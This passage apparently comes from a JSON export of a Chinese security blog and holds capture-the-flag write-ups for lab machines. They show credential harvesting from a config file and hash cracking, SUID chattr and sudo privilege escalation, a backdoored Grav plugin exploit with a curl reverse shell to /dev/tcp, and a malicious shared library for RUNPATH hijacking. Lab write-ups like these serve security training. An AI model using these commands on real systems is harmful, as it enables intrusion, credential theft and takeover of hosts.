discuz\n```\n\n\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2aCMS\u5e94\u7528\uff0c\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u901a\u5e38\u5305\u542b\u4e86\u9ad8\u6743\u9650\u7684\u6570\u636e\u5e93\u7528\u6237\u51ed\u636e\u3002\u6211\u4eec\u5728\u7f51\u7ad9\u6839\u76ee\u5f55 `/var/www/html/config/` \u4e0b\u627e\u5230\u4e86\u914d\u7f6e\u6587\u4ef6 `config_global.php`\u3002\n\n```shell\nwww-data@Chat2:/var/www/html/config$ cat config_global.php\n...\n$_config['db'][1]['dbhost'] = '127.0.0.1';\n$_config['db'][1]['dbuser'] = 'discuz_user';\n$_config['db'][1]['dbpw'] = 'StrongPassword!123';\n...\n```\n\n## **2. \u6570\u636e\u5e93\u4fe1\u606f\u6316\u6398**\n\n\u6211\u4eec\u627e\u5230\u4e86\u6570\u636e\u5e93\u7528\u6237 `discuz_user` \u548c\u5bc6\u7801 `StrongPassword!123`\u3002\u4f7f\u7528\u8be5\u51ed\u636e\u8fde\u63a5\u672c\u5730\u7684MariaDB\u6570\u636e\u5e93\u3002\n\n```shell\nwww-data@Chat2:/var/www/html/config$ mysql -u discuz_user -p'StrongPassword!123'\n...\nMariaDB [(none)]> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| discuz_db          |\n| information_schema |\n| mysql              |\n+--------------------+\n```\n\n\u5728 `discuz_db` \u6570\u636e\u5e93\u7684 `maze_ucenter_members` \u8868\u4e2d\uff0c\u6211\u4eec\u53ea\u53d1\u73b0\u4e86\u4e4b\u524d\u767b\u5f55Web\u540e\u53f0\u7684admin\u7528\u6237\u54c8\u5e0c\uff0c\u8fd9\u5bf9\u6a2a\u5411\u79fb\u52a8\u6ca1\u6709\u5e2e\u52a9\u3002\n\n\u4e8e\u662f\uff0c\u6211\u4eec\u5c06\u76ee\u5149\u8f6c\u5411\u4e86 `mysql` \u8fd9\u4e2a\u7cfb\u7edf\u6570\u636e\u5e93\uff0c\u5b83\u5b58\u50a8\u4e86\u6570\u636e\u5e93\u7684\u6240\u6709\u7528\u6237\u4fe1\u606f\u3002\n\n```shell\nMariaDB [discuz_db]> use mysql;\nDatabase changed\nMariaDB [mysql]> select user, host, password from user;\n...\n```\n\n\u67e5\u8be2 `user` \u8868\u540e\uff0c\u9664\u4e86\u5df2\u77e5\u7684 `discuz_user`\uff0c\u6211\u4eec\u8fd8\u53d1\u73b0\u4e86\u4e00\u4e2a\u540d\u4e3a `hackme` \u7684\u7528\u6237\uff0c\u5176\u5bc6\u7801\u54c8\u5e0c\u4e3a `FAAFFE644E901CFAFAEC7562415E5FAEC243B8B2`\u3002\u8fd9\u662f\u4e00\u4e2aMySQL 4.1\u7248\u672c\u4e4b\u524d\u7684\u65e7\u683c\u5f0f\u54c8\u5e0c\uff08`mysql_old_password`\uff09\u3002\n\n\u6211\u4eec\u4f7f\u7528\u5728\u7ebf\u54c8\u5e0c\u7834\u89e3\u7f51\u7ad9\uff08\u5982 crackstation.net\uff09\u5bf9\u6b64\u54c8\u5e0c\u8fdb\u884c\u67e5\u8be2\uff0c\u6210\u529f\u7834\u89e3\u51fa\u660e\u6587\u5bc6\u7801\u4e3a `root123`\u3002\n\n## **3. \u5207\u6362\u7528\u6237**\n\n\u6211\u4eec\u731c\u6d4b `hackme` \u7528\u6237\u7684\u5bc6\u7801\u53ef\u80fd\u4e0e\u7cfb\u7edf\u7528\u6237 `discuz` \u7684\u5bc6\u7801\u76f8\u540c\u3002\u5c1d\u8bd5\u4f7f\u7528 `su` \u547d\u4ee4\u5207\u6362\u5230 `discuz` \u7528\u6237\uff0c\u5e76\u8f93\u5165\u5bc6\u7801 `root123`\u3002\n\n```shell\nwww-data@Chat2:/var/www/html/config$ su discuz\nPassword: root123\ndiscuz@Chat2:/home$ id\nuid=1000(discuz) gid=1000(discuz) groups=1000(discuz)\n```\n\n\u6210\u529f\u5207\u6362\uff01\u6211\u4eec\u5df2\u7ecf\u4ece `www-data` \u7528\u6237\u6a2a\u5411\u79fb\u52a8\u5230\u4e86 `discuz` \u7528\u6237\u3002\n\n# **\u56db\u3001\u6743\u9650\u63d0\u5347**\n\n## **1. SUID\u63d0\u6743\u5411\u91cf\u4e0e\u6587\u4ef6\u5c5e\u6027**\n\n\u767b\u5f55 `discuz` \u7528\u6237\u540e\uff0c\u6211\u4eec\u9996\u5148\u68c0\u67e5\u8be5\u7528\u6237\u62e5\u6709\u7684 `sudo` \u6743\u9650\uff0c\u540c\u65f6\u5f00\u59cb\u5bfb\u627e\u7cfb\u7edf\u4e0a\u5176\u4ed6\u7684\u63d0\u6743\u5411\u91cf\uff0c\u4f8b\u5982\u67e5\u627e\u5177\u6709SUID\u6743\u9650\u4f4d\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\n\n```shell\n# \u68c0\u67e5sudo\u6743\u9650\ndiscuz@Chat2:~$ sudo -l\n...\nUser discuz may run the following commands on Chat2:\n    (ALL) NOPASSWD: /home/discuz/chat\n\n# \u67e5\u627e\u7cfb\u7edf\u8303\u56f4\u5185\u7684SUID\u6587\u4ef6\ndiscuz@Chat2:~$ find / -perm -4000 -type f -exec ls -l {} \\; 2>/dev/null\n...\n-rwsr-sr-x 1 root root 14336 Jan  9  2020 /usr/bin/chattr\n...\n```\n\n\u6211\u4eec\u5f97\u5230\u4e86\u4e24\u6761\u5173\u952e\u4fe1\u606f\uff1a\n\n1.  `discuz` \u7528\u6237\u53ef\u4ee5\u65e0\u5bc6\u7801\u4ee5root\u6743\u9650\u6267\u884c\u5176\u5bb6\u76ee\u5f55\u4e0b\u7684 `chat` \u7a0b\u5e8f\u3002\u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u76f4\u63a5\u7684\u63d0\u6743\u8def\u5f84\u3002\n2.  `/usr/bin/chattr` \u547d\u4ee4\u88ab\u8bbe\u7f6e\u4e86SUID\u4f4d\u3002\n\n> **\u77e5\u8bc6\u70b9\u8865\u5145**\uff1aSUID\uff08Set User ID\uff09\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u6743\u9650\u4f4d\u3002\u5f53\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u8bbe\u7f6e\u4e86SUID\u4f4d\u540e\uff0c\u4efb\u4f55\u7528\u6237\u5728\u6267\u884c\u5b83\u65f6\uff0c\u8fdb\u7a0b\u7684\u6709\u6548\u7528\u6237ID\uff08euid\uff09\u90fd\u4f1a\u53d8\u6210\u6587\u4ef6\u6240\u6709\u8005\u7684ID\u3002`chattr` \u7684\u6240\u6709\u8005\u662froot\uff0c\u56e0\u6b64\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u4ee5root\u6743\u9650\u6765\u6267\u884c `chattr` \u547d\u4ee4\u3002\n\n\u6211\u4eec\u7684\u4e3b\u8981\u653b\u51fb\u601d\u8def\u662f\u66ff\u6362 `/home/discuz/chat` \u6587\u4ef6\u4e3a\u4e00\u4e2a\u6076\u610f\u811a\u672c\uff0c\u7136\u540e\u901a\u8fc7 `sudo` \u6267\u884c\u5b83\u6765\u63d0\u6743\u3002\u7136\u800c\uff0c\u5f53\u6211\u4eec\u5c1d\u8bd5\u91cd\u547d\u540d\u6216\u5220\u9664\u8be5\u6587\u4ef6\u65f6\uff0c\u5374\u906d\u5230\u4e86\u62d2\u7edd\u3002\n\n```shell\ndiscuz@Chat2:~$ mv chat chat.bak\nmv: cannot move 'chat' to 'chat.bak': Operation not permitted\n```\n\n\u8fd9\u4e2a\u73b0\u8c61\u5f88\u4e0d\u5bfb\u5e38\uff0c\u56e0\u4e3a\u6211\u4eec\u4f5c\u4e3a `discuz` \u7528\u6237\uff0c\u5bf9\u81ea\u5df1\u5bb6\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u5e94\u8be5\u6709\u5199\u6743\u9650\u3002\u8fd9\u901a\u5e38\u610f\u5473\u7740\u6587\u4ef6\u88ab\u8bbe\u7f6e\u4e86\u7279\u6b8a\u7684\u6269\u5c55\u5c5e\u6027\u3002\u6211\u4eec\u4f7f\u7528 `lsattr` \u547d\u4ee4\u6765\u9a8c\u8bc1\u731c\u60f3\u3002\n\n```shell\ndiscuz@Chat2:~$ lsattr /home/discuz/chat\n----i---------e---- /home/discuz/chat\n```\n\n> **\u77e5\u8bc6\u70b9\u8865\u5145**\uff1a`lsattr` \u547d\u4ee4\u7528\u4e8e\u67e5\u770b\u6587\u4ef6\u7684\u6269\u5c55\u5c5e\u6027\u3002\u8fd9\u91cc\u7684 `i` \u5c5e\u6027\uff08immutable\uff09\u610f\u5473\u7740\u8be5\u6587\u4ef6\u88ab\u201c\u9501\u5b9a\u201d\uff0c\u5373\u4fbf\u662froot\u7528\u6237\u4e5f\u65e0\u6cd5\u4fee\u6539\u3001\u5220\u9664\u3001\u91cd\u547d\u540d\u6216\u521b\u5efa\u94fe\u63a5\u3002\n\n\u73b0\u5728\uff0c\u4e24\u6761\u7ebf\u7d22\u5b8c\u7f8e\u5730\u7ed3\u5408\u5728\u4e86\u4e00\u8d77\uff1a`chat` \u6587\u4ef6\u56e0\u4e3a `i` \u5c5e\u6027\u800c\u65e0\u6cd5\u88ab\u4fee\u6539\uff0c\u800c\u6211\u4eec\u6070\u597d\u62e5\u6709\u4e00\u4e2a\u5e26SUID\u7684 `chattr` \u547d\u4ee4\uff0c\u53ef\u4ee5\u7528\u5b83\u6765\u79fb\u9664\u8fd9\u4e2a `i` \u5c5e\u6027\u3002\n\n## **2. \u66ff\u6362\u6587\u4ef6\u5e76\u63d0\u6743**\n\n\u63d0\u6743\u601d\u8def\u5df2\u7ecf\u6e05\u6670\uff1a\n\n1.  \u5229\u7528\u5e26SUID\u7684 `/usr/bin/chattr` \u79fb\u9664 `/home/discuz/chat` \u7684 `i` \u5c5e\u6027\u3002\n2.  \u5c06 `/home/discuz/chat` \u66ff\u6362\u4e3a\u6211\u4eec\u81ea\u5df1\u7684\u6076\u610f\u811a\u672c\u3002\n3.  \u901a\u8fc7 `sudo` \u6267\u884c\u4fee\u6539\u540e\u7684 `chat` \u811a\u672c\uff0c\u4ee5root\u6743\u9650\u5b8c\u6210\u63d0\u6743\u3002\n\n\u6211\u4eec\u6784\u9020\u7684\u6076\u610f\u811a\u672c\u529f\u80fd\u662f\u4e3a `/bin/bash` \u6dfb\u52a0SUID\u6743\u9650\u4f4d\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u80fd\u968f\u65f6\u901a\u8fc7 `bash -p` \u83b7\u53d6\u4e00\u4e2aroot shell\u3002\n\n\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a\n\n```shell\n# 1. \u5229\u7528SUID chattr\u79fb\u9664 i \u5c5e\u6027\ndiscuz@Chat2:~$ /usr/bin/chattr -i /home/discuz/chat\n\n# 2. \u5907\u4efd\u539f\u6587\u4ef6\u5e76\u521b\u5efa\u6076\u610f\u811a\u672c\ndiscuz@Chat2:~$ mv chat chat.bak\ndiscuz@Chat2:~$ echo 'chmod +s /bin/bash' > chat\ndiscuz@Chat2:~$ chmod +x chat\n\n# 3. \u68c0\u67e5 /bin/bash \u5f53\u524d\u6743\u9650\ndiscuz@Chat2:~$ ls -la /bin/bash\n-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash\n\n# 4. \u4f7f\u7528sudo\u6267\u884c\u6211\u4eec\u7684\u811a\u672c\ndiscuz@Chat2:~$ sudo /home/discuz/chat\n\n# 5. \u518d\u6b21\u68c0\u67e5 /bin/bash \u6743\u9650\uff0c\u786e\u8ba4SUID\u4f4d\u5df2\u6dfb\u52a0\ndiscuz@Chat2:~$ ls -la /bin/bash\n-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash\n```\n\n\u53ef\u4ee5\u770b\u5230 `/bin/bash` \u5df2\u7ecf\u62e5\u6709\u4e86 `rws` \u6743\u9650\uff0cSUID\u4f4d\u8bbe\u7f6e\u6210\u529f\u3002\n\n## **3. \u83b7\u53d6Root Shell**\n\n\u6700\u540e\uff0c\u6267\u884c `bash -p` \u547d\u4ee4\uff0c\u5229\u7528SUID\u6743\u9650\u83b7\u5f97\u4e00\u4e2a euid \u4e3a 0 (root) \u7684shell\u3002\n\n```shell\ndiscuz@Chat2:~$ bash -p\nbash-5.0# id\nuid=1000(discuz) gid=1000(discuz) euid=0(root) egid=0(root) groups=0(root),1000(discuz)\n```\n\n> **\u77e5\u8bc6\u70b9\u8865\u5145**\uff1a`bash -p` \u4e2d\u7684 `-p` \u53c2\u6570\u544a\u8bc9bash\u4e0d\u8981\u5c06\u6709\u6548\u7528\u6237ID\uff08euid\uff09\u91cd\u7f6e\u4e3a\u5b9e\u9645\u7528\u6237ID\uff08uid\uff09\u3002\u5982\u679c\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\uff08\u5982bash\uff09\u8bbe\u7f6e\u4e86SUID\u4f4d\uff0c\u666e\u901a\u7528\u6237\u6267\u884c\u5b83\u65f6\uff0c\u8fdb\u7a0b\u7684euid\u4f1a\u53d8\u6210\u6587\u4ef6\u6240\u6709\u8005\uff08root\uff09\u7684ID\u3002`-p` \u53c2\u6570\u4fdd\u7559\u4e86\u8fd9\u4e2a\u63d0\u6743\u540e\u7684euid\uff0c\u4ece\u800c\u8ba9\u6211\u4eec\u83b7\u5f97root\u6743\u9650\u7684shell\u3002\n\n# **\u4e94\u3001\u593a\u53d6\u51ed\u8bc1**\n\n\u6210\u529f\u83b7\u53d6root\u6743\u9650\u540e\uff0c\u6211\u4eec\u8bfb\u53d6\u4f4d\u4e8e\u7528\u6237\u76ee\u5f55\u548croot\u76ee\u5f55\u4e0b\u7684flag\u6587\u4ef6\u3002\n\n```shell\nbash-5.0# cat /home/discuz/user.txt /root/root.txt\nflag{user-41352be6a84e5910fdef6afec4e41617}\nflag{root-099177104a7291ba00f83ab188987c5d}\n```\n\n\u6210\u529f\u83b7\u53d6\u6240\u6709flag\uff0c\u6e17\u900f\u6d4b\u8bd5\u7ed3\u675f\u3002sentence", "top": 0, "createdAt": 1755743256, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-21", "dateLabelColor": "#0969da"}, "P226": {"htmlDir": "docs/post/nei-bu-_Grav.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Grav", "postUrl": "post/nei-bu-_Grav.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/226", "commentNum": 0, "wordCount": 4758, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n\u9996\u5148\uff0c\u5728\u76ee\u6807\u7f51\u6bb5\u5185\u4f7f\u7528`arp-scan`\u8fdb\u884c\u4e3b\u673a\u53d1\u73b0\uff0c\u786e\u5b9a\u76ee\u6807\u4e3b\u673a\u7684IP\u5730\u5740\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\n...\n192.168.205.150 08:00:27:3c:ed:e0       PCS Systemtechnik GmbH\n...\n```\n\n\u53d1\u73b0\u76ee\u6807\u4e3b\u673aIP\u4e3a `192.168.205.150`\u3002\u63a5\u7740\uff0c\u4f7f\u7528`nmap`\u5bf9\u8be5\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u63a2\u6d4b\u5176\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p0-65535 192.168.205.150\n...\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:3C:ED:E0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\uff0c\u76ee\u6807\u4e3b\u673a\u5f00\u653e\u4e8622\u7aef\u53e3\uff08SSH\uff09\u548c80\u7aef\u53e3\uff08HTTP\uff09\u3002\n\n# **\u4e8c\u3001\u6f0f\u6d1e\u626b\u63cf\u4e0e\u5229\u7528**\n\n\u8bbf\u95ee80\u7aef\u53e3\u63d0\u4f9b\u7684Web\u670d\u52a1\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a\u4ea7\u54c1\u4ecb\u7ecd\u9875\u9762\uff0c\u6ca1\u6709\u592a\u591a\u53ef\u4ea4\u4e92\u7684\u529f\u80fd\u3002\u56e0\u6b64\uff0c\u4f7f\u7528`gobuster`\u8fdb\u884c\u76ee\u5f55\u626b\u63cf\uff0c\u4ee5\u53d1\u73b0\u9690\u85cf\u7684\u8def\u5f84\u6216\u6587\u4ef6\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.150 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64\n...\n/index.html           (Status: 200) [Size: 12350]\n/grav                 (Status: 301) [Size: 317] [--> http://192.168.205.150/grav/]\n...\n```\n\n\u626b\u63cf\u53d1\u73b0\u4e86\u4e00\u4e2a\u91cd\u8981\u7684\u76ee\u5f55 `/grav`\u3002\u8bbf\u95ee `http://192.168.205.150/grav/`\uff0c\u8bc6\u522b\u51fa\u8be5\u7ad9\u70b9\u662f\u57fa\u4e8e Grav CMS \u6784\u5efa\u7684\u3002\n\n\u5728\u6d4f\u89c8\u7f51\u9875\u5185\u5bb9\u65f6\uff0c\u4e8e`typography`\u9875\u9762\u53d1\u73b0\u4e86\u4e00\u7ec4\u7591\u4f3c\u540e\u53f0\u51ed\u636e\u7684\u5b57\u7b26\u4e32\uff1a`Grav Admin:Admin@123`\u3002\n\n![image-20250818165349274](http://7r1UMPHK.github.io/image/20250821190836487.webp)\n\n\u4f7f\u7528\u7528\u6237\u540d `admin` \u548c\u5bc6\u7801 `Admin@123` \u5c1d\u8bd5\u767b\u5f55\u540e\u53f0\u5730\u5740 `http://192.168.205.150/grav/admin`\uff0c\u6210\u529f\u8fdb\u5165\u7ba1\u7406\u9762\u677f\u3002\n\n\u767b\u5f55\u540e\u53f0\u540e\uff0c\u8ba1\u5212\u901a\u8fc7\u5b89\u88c5\u6076\u610f\u7684\u63d2\u4ef6\u6765\u83b7\u53d6\u670d\u52a1\u5668\u7684Shell\u3002\u8fd9\u91cc\u5229\u7528\u4e00\u4e2a\u5df2\u77e5\u7684\u63d2\u4ef6\u6f0f\u6d1e\uff08CVE-2025-50286\uff09\uff0c\u901a\u8fc7\u540e\u53f0\u7684\u201c\u76f4\u63a5\u5b89\u88c5\u201d\u529f\u80fd\u4e0a\u4f20\u4e00\u4e2a\u5305\u542b\u540e\u95e8\u7684\u63d2\u4ef6\u538b\u7f29\u5305 `grav-plugin-simple_form-develop.zip`\u3002\n\n> [!Tip]\n>\n> \u90a3\u4e2a\u63d2\u4ef6\u5229\u7528\u7684\u6a21\u677f\uff1ahttps://github.com/binneko/CVE-2025-50286\n>\n> \u4f46\u662f\u4ed6\u8fd9\u4e2a\u662f\u4f7f\u7528\u4e0d\u4e86\u7684\uff08\u6539\u6539\u80fd\u7528\uff1f\uff09\uff0c\u5efa\u8bae\u53bb\u6211\u4eec\u7fa4\u7684discord\uff0c\u770bSublarge\u53d1\u7684\u90a3\u4e2a\n>\n> ![image-20250818165621326](http://7r1UMPHK.github.io/image/20250821190812199.webp)\n\n![image-20250818170620504](http://7r1UMPHK.github.io/image/20250821190814531.webp)\n\n\u63d2\u4ef6\u5b89\u88c5\u5e76\u6fc0\u6d3b\u540e\uff0c\u5728Kali\u4e0a\u542f\u52a8`netcat`\u76d1\u542c8888\u7aef\u53e3\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\n```\n\n\u63a5\u7740\uff0c\u901a\u8fc7`curl`\u53d1\u9001\u4e00\u4e2a\u7cbe\u5fc3\u6784\u9020\u7684GET\u8bf7\u6c42\u6765\u89e6\u53d1\u63d2\u4ef6\u4e2d\u7684\u6f0f\u6d1e\uff0c\u6267\u884c\u53cd\u5411Shell\u547d\u4ee4\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl --get --data-urlencode 'cmd=bash -c 'bash -i >& /dev/tcp/192.168.205.128/8888 0>&1'' http://192.168.205.150/grav/\n```\n\n\u76d1\u542c\u7aef\u6210\u529f\u63a5\u6536\u5230\u53cd\u5f39Shell\uff0c\u5f53\u524d\u7528\u6237\u4e3a`www-data`\u3002\n\n```shell\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.150] 55952\nbash: cannot set terminal process group (404): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@Grav:/var/www/html/grav$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n\u4e3a\u4e86\u4fbf\u4e8e\u540e\u7eed\u64cd\u4f5c\uff0c\u9996\u5148\u5229\u7528`script`\u547d\u4ee4\u5c06\u5f53\u524d\u7684Shell\u5347\u7ea7\u4e3a\u529f\u80fd\u66f4\u5b8c\u6574\u7684\u4ea4\u4e92\u5f0fTTY\u3002\n\n```shell\nscript /dev/null -c bash\nCtrl+Z\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\nexport SHELL=/bin/bash\nstty rows 24 columns 80\n```\n\n\u5728\u670d\u52a1\u5668\u4e0a\u8fdb\u884c\u4fe1\u606f\u6536\u96c6\uff0c\u53d1\u73b0\u5728`/home/grav`\u76ee\u5f55\u4e0b\u5b58\u5728\u4e00\u4e2a\u63d0\u793a\u6587\u4ef6`.hint`\u3002\n\n```shell\nwww-data@Grav:/home/grav$ ls -al\n...\n-rw-r-xr--+ 1 root root   21 Aug 16 06:56 .hint\n-rw-r-x---+ 1 grav grav   44 Aug 16 07:05 user.txt\nwww-data@Grav:/home/grav$ cat .hint\ndo you know RUNPATH?\n```\n\n\u63d0\u793a\u4fe1\u606f\u63d0\u5230\u4e86`RUNPATH`\uff0c\u8fd9\u662f\u4e00\u79cd\u5728ELF\u6587\u4ef6\u4e2d\u6307\u5b9a\u7684\u8fd0\u884c\u65f6\u5e93\u641c\u7d22\u8def\u5f84\u3002\u5b83\u5177\u6709\u6bd4`LD_PRELOAD`\u548c`LD_LIBRARY_PATH`\u66f4\u9ad8\u7684\u4f18\u5148\u7ea7\uff0c\u5982\u679c\u914d\u7f6e\u4e0d\u5f53\u53ef\u80fd\u5bfc\u81f4\u5e93\u52ab\u6301\u6f0f\u6d1e\u3002\n\n\u6839\u636e\u63d0\u793a\uff0c\u5f00\u59cb\u5bfb\u627e\u5177\u6709SUID\u6743\u9650\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u8fd9\u4e9b\u6587\u4ef6\u662f\u63d0\u6743\u7684\u5e38\u89c1\u5165\u53e3\u70b9\u3002\n\n```shell\nwww-data@Grav:/var/www/html/grav$ find / -perm -4000 -type f -exec ls -l {} \\; 2>/dev/null\n...\n-rwsr-xr-x 1 root root 17536 Aug 17 02:35 /usr/local/bin/usermgr\n...\n```\n\n\u53d1\u73b0\u4e00\u4e2a\u53ef\u7591\u7684SUID\u6587\u4ef6 `/usr/local/bin/usermgr`\u3002\u4f7f\u7528`readelf`\u68c0\u67e5\u5176\u52a8\u6001\u94fe\u63a5\u4fe1\u606f\uff0c\u786e\u8ba4\u5176`RUNPATH`\u88ab\u8bbe\u7f6e\u4e3a\u5f53\u524d\u76ee\u5f55 `.`\u3002\n\n```shell\nwww-data@Grav:/home/grav$ readelf -d /usr/local/bin/usermgr | grep RUNPATH\n 0x000000000000001d (RUNPATH)            Library runpath: [.]\n```\n\n\u63a5\u7740\uff0c\u4f7f\u7528`ldd`\u67e5\u770b\u8be5\u7a0b\u5e8f\u4f9d\u8d56\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u3002\n\n```shell\nwww-data@Grav:/home/grav$ ldd /usr/local/bin/usermgr\n        linux-vdso.so.1 (0x00007ffdbeac0000)\n        libauth.so => /lib/libauth.so (0x00007fa27b1ff000)\n        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa27b02b000)\n        /lib64/ld-linux-x86-64.so.2 (0x00007fa27b214000)\n```\n\n`usermgr`\u4f9d\u8d56\u4e00\u4e2a\u540d\u4e3a`libauth.so`\u7684\u5e93\u3002\u7531\u4e8e`RUNPATH`\u88ab\u8bbe\u7f6e\u4e3a `.`\uff0c\u8fd9\u610f\u5473\u7740\u5f53\u6267\u884c`/usr/local/bin/usermgr`\u65f6\uff0c\u7cfb\u7edf\u4f1a\u9996\u5148\u5728\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u4e0b\u67e5\u627e`libauth.so`\u3002\u8fd9\u4e3a\u6211\u4eec\u5b9e\u65bd\u5e93\u52ab\u6301\u63d0\u4f9b\u4e86\u6761\u4ef6\u3002\n\n\u5207\u6362\u5230\u5177\u6709\u5199\u6743\u9650\u7684\u76ee\u5f55`/tmp`\uff0c\u5e76\u7f16\u5199\u4e00\u4e2a\u6076\u610f\u7684C\u6e90\u6587\u4ef6`a.c`\u3002\u8be5\u6587\u4ef6\u5229\u7528GCC\u7684`__attribute__((constructor))`\u7279\u6027\uff0c\u5728\u5e93\u88ab\u52a0\u8f7d\u65f6\u81ea\u52a8\u6267\u884c\u4ee3\u7801\uff0c\u4ee5root\u6743\u9650\u751f\u6210\u4e00\u4e2abash shell\u3002\n\n```c\n// a.c\n#include <unistd.h>\n#include <stdlib.h>\n\nvoid __attribute__((constructor)) run_on_load() {\n    setuid(0);\n    setgid(0);\n    char *args[] = {'/bin/bash', NULL};\n    execve('/bin/bash', args, NULL);\n}\n```\n\n\u5c06\u8be5C\u6587\u4ef6\u7f16\u8bd1\u4e3a\u540d\u4e3a`libauth.so`\u7684\u5171\u4eab\u5e93\u3002\n\n```shell\nwww-data@Grav:/tmp$ gcc -shared -fPIC -o libauth.so a.c\n```\n\n\u6700\u540e\uff0c\u5728`/tmp`\u76ee\u5f55\u4e0b\u6267\u884c`/usr/local/bin/usermgr`\u3002\u7531\u4e8e`RUNPATH`\u7684\u8bbe\u7f6e\uff0c\u7a0b\u5e8f\u4f1a\u52a0\u8f7d\u6211\u4eec\u653e\u5728`/tmp`\u4e0b\u7684\u6076\u610f`libauth.so`\uff0c\u4ece\u800c\u6267\u884c\u5176\u4e2d\u7684\u63d0\u6743\u4ee3\u7801\u3002\n\n```shell\nwww-data@Grav:/tmp$ /usr/local/bin/usermgr\nroot@Grav:/tmp# id\nuid=0(root) gid=0(root) groups=0(root),33(www-data)\n```\n\n\u6210\u529f\u83b7\u53d6root\u6743\u9650\u3002\u73b0\u5728\u53ef\u4ee5\u8bfb\u53d6\u6240\u6709\u7684flag\u6587\u4ef6\u3002\n\n```shell\nroot@Grav:/tmp# cat /root/root.txt /home/grav/user.txt\nflag{root-67f2a835697e7c9c2c5146c76eca6038}\nflag{user-ab72ef6c613b6a51db91eedd34271143}\n```sentence", "top": 0, "createdAt": 1755774552, "style": "<style>.markdown-alert{padding:0.5rem 1rem;margin-bottom:1rem;border-left:.25em solid var(--borderColor-default,var(--color-border-default));}.markdown-alert .markdown-alert-title {display:flex;font-weight:var(--base-text-weight-medium,500);align-items:center;line-height:1;}.markdown-alert>:first-child {margin-top:0;}.markdown-alert>:last-child {margin-bottom:0;}</style><style>.markdown-alert.markdown-alert-tip {border-left-color:var(--borderColor-success-emphasis, var(--color-success-emphasis));background-color:var(--color-success-subtle);}.markdown-alert.markdown-alert-tip .markdown-alert-title {color: var(--fgColor-success,var(--color-success-fg));}</style>", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-21", "dateLabelColor": "#0969da"}, "P227": {"htmlDir": "docs/post/nei-bu-_novice-admin.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_novice-admin", "postUrl": "post/nei-bu-_novice-admin.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/227", "commentNum": 0, "wordCount": 18862, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## **1.1 \u4e3b\u673a\u53d1\u73b0**\n\n\u9996\u5148\uff0c\u5728\u5f53\u524d\u5185\u7f51\u73af\u5883\u4e2d\u8fdb\u884c\u4e3b\u673a\u53d1\u73b0\uff0c\u4ee5\u786e\u5b9a\u6f5c\u5728\u7684\u653b\u51fb\u76ee\u6807\u3002\u6211\u4eec\u4f7f\u7528 `arp-scan` \u5bf9\u672c\u5730 `eth0` \u7f51\u5361\u6240\u5728\u7684 `192.168.205.0/24` 